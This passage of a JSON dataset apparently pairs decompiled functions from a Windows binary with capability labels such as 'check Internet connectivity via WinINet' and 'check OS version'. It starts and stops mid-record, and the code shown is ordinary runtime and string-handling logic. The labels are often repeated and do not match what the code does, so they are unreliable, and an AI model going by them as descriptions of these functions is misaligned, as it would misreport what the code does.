*(&stack0xffffffffffffff30 + iVar4) = unaff_RDI;\n    *(&stack0xffffffffffffff28 + iVar4) = pcVar9;\n    *(&stack0xffffffffffffff20 + iVar4) = &stack0xffffffffffffff58 + iVar4;\n    if (*0x140109390 != '\\0') goto code_r0x000140021d06;\n    *0x140109390 = '\\x01';\n    *(&stack0xfffffffffffffee8 + iVar4) = 0x140021c20;\n    iVar5 = fcn.1400bca10();\n    if (iVar5 != 0) {\n        pcVar10 = *(iVar5 + 8);\n        cVar1 = *pcVar10;\n        *(&stack0xffffffffffffff1c + iVar4) = 0xffffffff;\n        pcVar10 = pcVar10 + (cVar1 == '*');\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x140021c52;\n        uVar6 = fcn.1400135c0(pcVar10, 0, 0, &stack0xffffffffffffff1c + iVar4);\n        pcVar9 = *0x140106580;\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x140021c63;\n        uVar7 = (**0x140106580)(2);\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x140021c7d;\n        sub.msvcrt.dll_fwrite(\"terminate called after throwing an instance of \\'\", 1, 0x30, uVar7);\n        if (*(&stack0xffffffffffffff1c + iVar4) == 0) goto code_r0x000140021ccd;\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x140021c8c;\n        uVar7 = (*pcVar9)(2);\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x140021c97;\n        sub.msvcrt.dll_fputs(pcVar10, uVar7);\n        do {\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021c9e;\n            uVar7 = (*pcVar9)(2);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021cb8;\n            sub.msvcrt.dll_fwrite(0x14010a691, 1, 2, uVar7);\n            if (*(&stack0xffffffffffffff1c + iVar4) == 0) {\n                *(&stack0xfffffffffffffee8 + iVar4) = 0x140021cc8;\n                fcn.14001e510(uVar6);\n            }\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021ccd;\n            fcn.1400bcd60();\ncode_r0x000140021ccd:\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021ccf;\n            uVar7 = (*pcVar9)();\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021cda;\n            sub.msvcrt.dll_fputs(uVar6, uVar7);\n        } while( true );\n    }\n    *(&stack0xfffffffffffffee8 + iVar4) = 0x140021ce7;\n    uVar6 = (**0x140106580)(2);\n    *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d01;\n    sub.msvcrt.dll_fwrite(\"terminate called without an active exception\\n\", 1, 0x2d, uVar6);\n    do {\n        while( true ) {\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d06;\n            sub.msvcrt.dll_abort();\ncode_r0x000140021d06:\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d11;\n            uVar6 = (**0x140106580)(2);\n            iVar5 = 1;\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d2b;\n            sub.msvcrt.dll_fwrite(\"terminate called recursively\\n\", 1, 0x1d, uVar6);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d30;\n            uVar6 = sub.msvcrt.dll_abort();\n            if (iVar5 != 1) break;\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d3e;\n            piVar8 = fcn.1400bc860(uVar6);\n            pcVar2 = *(*piVar8 + 0x10);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d47;\n            uVar6 = (*pcVar2)(piVar8);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d51;\n            uVar7 = (*pcVar9)(2);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d6b;\n            sub.msvcrt.dll_fwrite(\"  what():  \", 1, 0xb, uVar7);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d72;\n            uVar7 = (*pcVar9)(2);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d7d;\n            sub.msvcrt.dll_fputs(uVar6, uVar7);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d84;\n            uVar6 = (*pcVar9)(2);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d91;\n            sub.msvcrt.dll_fputc(10, uVar6);\n            *(&stack0xfffffffffffffee8 + iVar4) = 0x140021d96;\n            fcn.1400bca40();\n        }\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x140021da0;\n        fcn.1400bc860(uVar6);\n        *(&stack0xfffffffffffffee8 + iVar4) = 0x140021da5;\n        fcn.1400bca40();\n    } while( true );\n}\n",
        "token_count": 2606
    },
    "140023e1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140023e10(int64_t *arg1, ushort *arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    ushort *puVar1;\n    uint64_t arg4_00;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    \n    arg4_00 = *(*arg1 + -0x18);\n    if (arg4_00 < arg4) {\n        puVar2 = 0x14010ab70;\n        fcn.1400b7b60(0x14010ab70, 0x14010abec, arg4, arg4_00);\n        return *puVar2;\n    }\n    uVar3 = arg4_00 - arg4;\n    if (arg3 < arg4_00 - arg4) {\n        uVar3 = arg3;\n    }\n    if (uVar3 != 0) {\n        puVar1 = *arg1 + arg4 * 2;\n        if (uVar3 == 1) {\n            *arg2 = *puVar1;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(arg2, puVar1, uVar3 * 2);\n    }\n    return uVar3;\n}\n",
        "token_count": 275
    },
    "140024ea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140024ea0(int64_t *arg1, uchar *arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    uint64_t arg4_00;\n    uint64_t *puVar1;\n    uchar *puVar2;\n    uint64_t uVar3;\n    \n    arg4_00 = *(*arg1 + -0x18);\n    if (arg4_00 < arg4) {\n        puVar1 = 0x14010a9b0;\n        fcn.1400b7b60(0x14010a9b0, 0x14010aa2c, arg4, arg4_00);\n        return *puVar1;\n    }\n    uVar3 = arg4_00 - arg4;\n    if (arg3 < arg4_00 - arg4) {\n        uVar3 = arg3;\n    }\n    if (uVar3 != 0) {\n        puVar2 = *arg1 + arg4;\n        if (uVar3 == 1) {\n            *arg2 = *puVar2;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(arg2, puVar2, uVar3);\n    }\n    return uVar3;\n}\n",
        "token_count": 274
    },
    "14002709": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool fcn.140027090(int64_t *arg1)\n\n{\n    return *arg1 != 0;\n}\n",
        "token_count": 26
    },
    "14002b2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14002b2c0(int64_t *arg1)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    int16_t iVar6;\n    int16_t iVar7;\n    int16_t iVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    int16_t iVar11;\n    int16_t iVar12;\n    int16_t iVar13;\n    int16_t iVar14;\n    int16_t iVar15;\n    int16_t iVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    uint64_t uVar19;\n    uint32_t uVar20;\n    uint64_t uVar21;\n    uint16_t uVar22;\n    int32_t iVar23;\n    uint *puVar24;\n    uint *puVar25;\n    ulong uVar26;\n    uchar auVar28 [16];\n    ushort uVar30;\n    uint16_t uVar31;\n    uchar auVar29 [16];\n    int64_t iVar32;\n    int64_t iVar33;\n    ushort uVar34;\n    uint uStack408;\n    uint uStack404;\n    uint uStack400;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint auStack152 [32];\n    uchar auVar27 [12];\n    \n    puVar24 = &uStack408;\n    auVar28 = *0x14010ad40;\n    do {\n        puVar25 = puVar24 + 4;\n        iVar32 = SUB168(auVar28, 0);\n        iVar33 = SUB168(auVar28 >> 0x40, 0);\n        uVar20 = SUB164(auVar28, 0);\n        iVar23 = uVar20 + *0x14010ad60;\n        uVar22 = SUB162(auVar28 >> 0x40, 0);\n        uVar26 = CONCAT44(SUB164(auVar28 >> 0x40, 0), uVar20);\n        auVar27 = CONCAT48(iVar23, uVar26);\n        uVar17 = iVar32 + *0x14010ad70 & 0xffffffff;\n        uVar30 = iVar33 + *0x14010ad78;\n        auVar29 = CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214((iVar33 + *0x14010ad78 << 0x20) >> 0x30, \n                                                                              CONCAT212(SUB162(auVar28 >> 0x50, 0), \n                                                                                        auVar27)) >> 0x60, 0), \n                                                             CONCAT210(uVar30, SUB1210(auVar27, 0))) >> 0x50, 0), \n                                            CONCAT28(uVar22, uVar26)) >> 0x40, 0), (uVar17 >> 0x10) << 0x30) &\n                  0xffff000000000000;\n        uVar34 = iVar23 >> 0x10;\n        uVar19 = CONCAT24(uVar34, (uVar20 + *0x14010ad80) * 0x10000) & 0xffff0000;\n        auVar28 = CONCAT124(SUB1612(CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214(uVar20 + *0x14010ad80 >>\n                                                                                                0x10, CONCAT212(uVar17 \n                                                            >> 0x10, SUB1612(auVar29, 0))) >> 0x60, 0), \n                                                            CONCAT210(uVar34, SUB1610(auVar29, 0))) >> 0x50, 0), \n                                                            CONCAT28(SUB162(auVar28 >> 0x10, 0), SUB168(auVar29, 0))) >>\n                                                    0x40, 0), (uVar19 >> 0x10) << 0x30) >> 0x20, 0) &\n                            SUB1612(0xffff000000000000 >> 0x20, 0), iVar23 * 0x10000);\n        iVar23 = uVar20 + *0x14010ada0;\n        auVar28 = CONCAT124(SUB1612(CONCAT106(SUB1610(CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214(uVar22\n                                                                                                                  + *\n                                                            0x14010ad88, CONCAT212(uVar19 >> 0x10, SUB1612(auVar28, 0)))\n                                                            >> 0x60, 0), CONCAT210(uVar30, SUB1610(auVar28, 0))) >> 0x50\n                                                            , 0), CONCAT28(uVar17, SUB168(auVar28, 0))) >> 0x40, 0), \n                                                            ((CONCAT24(uVar30, CONCAT22(uVar22 + *0x14010ad68, uVar22))\n                                                             & 0xffff0000) >> 0x10) << 0x30) >> 0x30, 0), \n                                              (SUB166(auVar28, 0) >> 0x10) << 0x20) >> 0x20, 0), \n                            uVar20 & 0xffff | uVar22 << 0x10) & *0x14010add0;\n        uVar17 = iVar32 + *0x14010ad90 & 0xffffffff;\n        iVar18 = iVar33 + *0x14010ad98 << 0x20;\n        uVar19 = iVar32 + *0x14010adb0 & 0xffffffff;\n        uVar34 = iVar33 + *0x14010adb8;\n        uVar31 = iVar33 + *0x14010ad98;\n        auVar29 = CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214((iVar33 + *0x14010adb8 << 0x20) >> 0x30, \n                                                                              CONCAT212(iVar18 >> 0x30, \n                                                                                        CONCAT48(iVar23, iVar18))) >>\n                                                                    0x60, 0), \n                                                             CONCAT210(uVar34, SUB1210(CONCAT48(iVar23, iVar18), 0))) >>\n                                                   0x50, 0), CONCAT28(uVar31, iVar18)) >> 0x40, 0), \n                           (uVar19 >> 0x10) << 0x30) & 0xffff000000000000;\n        uVar30 = iVar23 >> 0x10;\n        uVar21 = CONCAT24(uVar30, (uVar20 + *0x14010adc0) * 0x10000) & 0xffff0000;\n        auVar29 = CONCAT124(SUB1612(CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214(uVar20 + *0x14010adc0 >>\n                                                                                                0x10, CONCAT212(uVar19 \n                                                            >> 0x10, SUB1612(auVar29, 0))) >> 0x60, 0), \n                                                            CONCAT210(uVar30, SUB1610(auVar29, 0))) >> 0x50, 0), \n                                                            CONCAT28(uVar17 >> 0x10, SUB168(auVar29, 0))) >> 0x40, 0), \n                                             (uVar21 >> 0x10) << 0x30) >> 0x20, 0) &\n                            SUB1612(0xffff000000000000 >> 0x20, 0), iVar23 * 0x10000);\n        auVar29 = CONCAT124(SUB1612(CONCAT106(SUB1610(CONCAT88(SUB168(CONCAT610(SUB166(CONCAT412(SUB164(CONCAT214(uVar22\n                                                                                                                  + *\n                                                            0x14010adc8, CONCAT212(uVar21 >> 0x10, SUB1612(auVar29, 0)))\n                                                            >> 0x60, 0), CONCAT210(uVar34, SUB1610(auVar29, 0))) >> 0x50\n                                                            , 0), CONCAT28(uVar19, SUB168(auVar29, 0))) >> 0x40, 0), \n                                                            ((CONCAT24(uVar34, CONCAT22(uVar22 + *0x14010ada8, uVar31))\n                                                             & 0xffff0000) >> 0x10) << 0x30) >> 0x30, 0), \n                                              (SUB166(auVar29, 0) >> 0x10) << 0x20) >> 0x20, 0), \n                            uVar17 & 0xffff | uVar31 << 0x10) & *0x14010add0;\n        iVar1 = SUB162(auVar28, 0);\n        iVar2 = SUB162(auVar28 >> 0x10, 0);\n        iVar3 = SUB162(auVar28 >> 0x20, 0);\n        iVar4 = SUB162(auVar28 >> 0x30, 0);\n        iVar5 = SUB162(auVar28 >> 0x40, 0);\n        iVar6 = SUB162(auVar28 >> 0x50, 0);\n        iVar7 = SUB162(auVar28 >> 0x60, 0);\n        iVar8 = SUB162(auVar28 >> 0x70, 0);\n        iVar9 = SUB162(auVar29, 0);\n        iVar10 = SUB162(auVar29 >> 0x10, 0);\n        iVar11 = SUB162(auVar29 >> 0x20, 0);\n        iVar12 = SUB162(auVar29 >> 0x30, 0);\n        iVar13 = SUB162(auVar29 >> 0x40, 0);\n        iVar14 = SUB162(auVar29 >> 0x50, 0);\n        iVar15 = SUB162(auVar29 >> 0x60, 0);\n        iVar16 = SUB162(auVar29 >> 0x70, 0);\n        *puVar24 = (0 < iVar1) * (iVar1 < 0xff) * SUB161(auVar28, 0) - (0xff < iVar1);\n        *(puVar24 + 1) = (0 < iVar2) * (iVar2 < 0xff) * SUB161(auVar28 >> 0x10, 0) - (0xff < iVar2);\n        *(puVar24 + 2) = (0 < iVar3) * (iVar3 < 0xff) * SUB161(auVar28 >> 0x20, 0) - (0xff < iVar3);\n        *(puVar24 + 3) = (0 < iVar4) * (iVar4 < 0xff) * SUB161(auVar28 >> 0x30, 0) - (0xff < iVar4);\n        *(puVar24 + 1) = (0 < iVar5) * (iVar5 < 0xff) * SUB161(auVar28 >> 0x40, 0) - (0xff < iVar5);\n        *(puVar24 + 5) = (0 < iVar6) * (iVar6 < 0xff) * SUB161(auVar28 >> 0x50, 0) - (0xff < iVar6);\n        *(puVar24 + 6) = (0 < iVar7) * (iVar7 < 0xff) * SUB161(auVar28 >> 0x60, 0) - (0xff < iVar7);\n        *(puVar24 + 7) = (0 < iVar8) * (iVar8 < 0xff) * SUB161(auVar28 >> 0x70, 0) - (0xff < iVar8);\n        *(puVar24 + 2) = (0 < iVar9) * (iVar9 < 0xff) * SUB161(auVar29, 0) - (0xff < iVar9);\n        *(puVar24 + 9) = (0 < iVar10) * (iVar10 < 0xff) * SUB161(auVar29 >> 0x10, 0) - (0xff < iVar10);\n        *(puVar24 + 10) = (0 < iVar11) * (iVar11 < 0xff) * SUB161(auVar29 >> 0x20, 0) - (0xff < iVar11);\n        *(puVar24 + 0xb) = (0 < iVar12) * (iVar12 < 0xff) * SUB161(auVar29 >> 0x30, 0) - (0xff < iVar12);\n        *(puVar24 + 3) = (0 < iVar13) * (iVar13 < 0xff) * SUB161(auVar29 >> 0x40, 0) - (0xff < iVar13);\n        *(puVar24 + 0xd) = (0 < iVar14) * (iVar14 < 0xff) * SUB161(auVar29 >> 0x50, 0) - (0xff < iVar14);\n        *(puVar24 + 0xe) = (0 < iVar15) * (iVar15 < 0xff) * SUB161(auVar29 >> 0x60, 0) - (0xff < iVar15);\n        *(puVar24 + 0xf) = (0 < iVar16) * (iVar16 < 0xff) * SUB161(auVar29 >> 0x70, 0) - (0xff < iVar16);\n        puVar24 = puVar25;\n        auVar28 = CONCAT88(iVar33 + *0x14010ad58, iVar32 + *0x14010ad50);\n    } while (auStack152 != puVar25);\n    if (*(*arg1 + 0x38) == 0x14002ba80) {\n        *(arg1 + 0x39) = uStack408;\n        *(arg1 + 0x3d) = uStack404;\n        *(arg1 + 0x41) = uStack400;\n        *(arg1 + 0x45) = uStack396;\n        *(arg1 + 0x49) = uStack392;\n        *(arg1 + 0x4d) = uStack388;\n        *(arg1 + 0x51) = uStack384;\n        *(arg1 + 0x55) = uStack380;\n        *(arg1 + 0x59) = uStack376;\n        *(arg1 + 0x5d) = uStack372;\n        *(arg1 + 0x61) = uStack368;\n        *(arg1 + 0x65) = uStack364;\n        *(arg1 + 0x69) = uStack360;\n        *(arg1 + 0x6d) = uStack356;\n        *(arg1 + 0x71) = uStack352;\n        *(arg1 + 0x75) = uStack348;\n        *(arg1 + 0x79) = uStack344;\n        *(arg1 + 0x7d) = uStack340;\n        *(arg1 + 0x81) = uStack336;\n        *(arg1 + 0x85) = uStack332;\n        *(arg1 + 0x89) = uStack328;\n        *(arg1 + 0x8d) = uStack324;\n        *(arg1 + 0x91) = uStack320;\n        *(arg1 + 0x95) = uStack316;\n        *(arg1 + 0x99) = uStack312;\n        *(arg1 + 0x9d) = uStack308;\n        *(arg1 + 0xa1) = uStack304;\n        *(arg1 + 0xa5) = uStack300;\n        *(arg1 + 0xa9) = uStack296;\n        *(arg1 + 0xad) = uStack292;\n        *(arg1 + 0xb1) = uStack288;\n        *(arg1 + 0xb5) = uStack284;\n        *(arg1 + 0xb9) = uStack280;\n        *(arg1 + 0xbd) = uStack276;\n        *(arg1 + 0xc1) = uStack272;\n        *(arg1 + 0xc5) = uStack268;\n        *(arg1 + 0xc9) = uStack264;\n        *(arg1 + 0xcd) = uStack260;\n        *(arg1 + 0xd1) = uStack256;\n        *(arg1 + 0xd5) = uStack252;\n        *(arg1 + 0xd9) = uStack248;\n        *(arg1 + 0xdd) = uStack244;\n        *(arg1 + 0xe1) = uStack240;\n        *(arg1 + 0xe5) = uStack236;\n        *(arg1 + 0xe9) = uStack232;\n        *(arg1 + 0xed) = uStack228;\n        *(arg1 + 0xf1) = uStack224;\n        *(arg1 + 0xf5) = uStack220;\n        *(arg1 + 0xf9) = uStack216;\n        *(arg1 + 0xfd) = uStack212;\n        *(arg1 + 0x101) = uStack208;\n        *(arg1 + 0x105) = uStack204;\n        *(arg1 + 0x109) = uStack200;\n        *(arg1 + 0x10d) = uStack196;\n        *(arg1 + 0x111) = uStack192;\n        *(arg1 + 0x115) = uStack188;\n        *(arg1 + 0x119) = uStack184;\n        *(arg1 + 0x11d) = uStack180;\n        *(arg1 + 0x121) = uStack176;\n        *(arg1 + 0x125) = uStack172;\n        *(arg1 + 0x129) = uStack168;\n        *(arg1 + 0x12d) = uStack164;\n        *(arg1 + 0x131) = uStack160;\n        *(arg1 + 0x135) = uStack156;\n    }\n    else {\n        (**(*arg1 + 0x38))(arg1, &uStack408, auStack152, arg1 + 0x39);\n    }\n    iVar23 = sub.msvcrt.dll_memcmp(&uStack408, arg1 + 0x39, 0x100);\n    *(arg1 + 7) = '\\x02' - (iVar23 == 0);\n    return;\n}\n",
        "token_count": 4513
    },
    "14002b94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14002b940(int64_t *arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    if (*(arg1 + 7) != '\\x01') {\n        if (*(arg1 + 7) == '\\0') {\n            fcn.14002b2c0(arg1);\n        }\n        if (*(*arg1 + 0x38) != 0x14002ba80) {\n    // WARNING: Could not recover jumptable at 0x00014002b9b4. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(*arg1 + 0x38))(arg1, arg2, arg3, arg4);\n            return;\n        }\n    }\n    if (arg2 != arg3) {\n    // WARNING: Could not recover jumptable at 0x00014001e560. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_memcpy)(arg4, arg2, arg3 - arg2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "14002c0d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14002c0d0(int64_t **arg1, int64_t *arg2)\n\n{\n    int64_t **ppiVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t **ppiVar5;\n    int64_t *piVar6;\n    ulong uVar7;\n    ulong uVar8;\n    int64_t *piVar9;\n    code *pcVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    \n    *(arg1 + 2) = 0;\n    iVar13 = *arg2;\n    ppiVar1 = arg1 + 2;\n    *arg1 = ppiVar1;\n    piVar9 = *(iVar13 + 0x20);\n    arg1[1] = NULL;\n    iVar13 = *piVar9;\n    if (iVar13 == 0) {\n        fcn.1400a76a0(arg1, 0, 0, 1);\n        return arg1;\n    }\n    if (piVar9[1] != 0) {\n        uVar4 = 0;\n        do {\n            uVar12 = uVar4 + 1;\n            iVar3 = sub.msvcrt.dll_strcmp(piVar9[uVar4]);\n            if (iVar3 != 0) {\n                pcVar10 = pe_nt_image_headers64;\n                fcn.1400a9080(arg1, 0x80);\n                puVar2 = **0x14010ff60;\n                uVar7 = *puVar2;\n                uVar4 = sub.msvcrt.dll_strlen(uVar7);\n                if (0x3fffffffffffffffU - arg1[1] < uVar4) goto code_r0x00014002c3e6;\n                fcn.1400a91c0(arg1, uVar7, uVar4);\n                piVar9 = arg1[1];\n                piVar6 = *arg1;\n                if (ppiVar1 == piVar6) {\n                    pcVar10 = 0xf;\n                }\n                else {\n                    pcVar10 = arg1[2];\n                }\n                if (pcVar10 < piVar9 + 1) {\n                    pcVar10 = piVar9;\n                    fcn.1400a9390(arg1, piVar9, 0, 0);\n                    piVar6 = *arg1;\n                }\n                *(piVar6 + piVar9) = 0x3d;\n                arg1[1] = piVar9 + 1;\n                *(*arg1 + 1 + piVar9) = 0;\n                uVar7 = **(*arg2 + 0x20);\n                uVar4 = sub.msvcrt.dll_strlen(uVar7);\n                if (0x3fffffffffffffffU - arg1[1] < uVar4) goto code_r0x00014002c3da;\n                fcn.1400a91c0(arg1, uVar7, uVar4);\n                iVar13 = 8;\n                goto code_r0x00014002c2e8;\n            }\n            uVar4 = uVar12;\n        } while (uVar12 < 5);\n    }\n    sub.msvcrt.dll_strlen(iVar13);\n    fcn.1400a6b40(arg1, 0, 0, iVar13);\n    return arg1;\ncode_r0x00014002c2e8:\n    piVar9 = arg1[1];\n    ppiVar5 = *arg1;\n    if (ppiVar1 == ppiVar5) {\n        pcVar10 = 0xf;\n    }\n    else {\n        pcVar10 = arg1[2];\n    }\n    if (pcVar10 < piVar9 + 1) {\n        pcVar10 = piVar9;\n        fcn.1400a9390(arg1, piVar9, 0, 0);\n        ppiVar5 = *arg1;\n    }\n    *(ppiVar5 + piVar9) = 0x3b;\n    arg1[1] = piVar9 + 1;\n    *(*arg1 + 1 + piVar9) = 0;\n    uVar7 = *(puVar2 + iVar13);\n    uVar4 = sub.msvcrt.dll_strlen(uVar7);\n    if (0x3fffffffffffffffU - arg1[1] < uVar4) {\ncode_r0x00014002c3ce:\n        fcn.1400bd360(0x14010a72e);\ncode_r0x00014002c3da:\n        fcn.1400bd360(0x14010a72e);\ncode_r0x00014002c3e6:\n        ppiVar5 = fcn.1400bd360(0x14010a72e);\n        if (ppiVar1 != *arg1) {\n            fcn.1400bc6c0();\n        }\n        fcn.140014f30(ppiVar5);\n        piVar6 = fcn.14007b890(0, 0);\n        iVar13 = *pcVar10;\n        *ppiVar5 = piVar6;\n        piVar9 = *(iVar13 + 0x20);\n        iVar13 = *piVar9;\n        if (iVar13 == 0) {\n            fcn.14007bd00(ppiVar5, 0, piVar6[-3], 1);\n            return ppiVar5;\n        }\n        if (piVar9[1] == 0) {\ncode_r0x00014002c480:\n            uVar7 = sub.msvcrt.dll_strlen(iVar13);\n            fcn.14007c880(ppiVar5, iVar13, uVar7);\n            return ppiVar5;\n        }\n        uVar4 = 0;\n        while( true ) {\n            uVar12 = uVar4 + 1;\n            iVar3 = sub.msvcrt.dll_strcmp(piVar9[uVar4], piVar9[uVar12]);\n            if (iVar3 != 0) break;\n            uVar4 = uVar12;\n            if (4 < uVar12) goto code_r0x00014002c480;\n        }\n        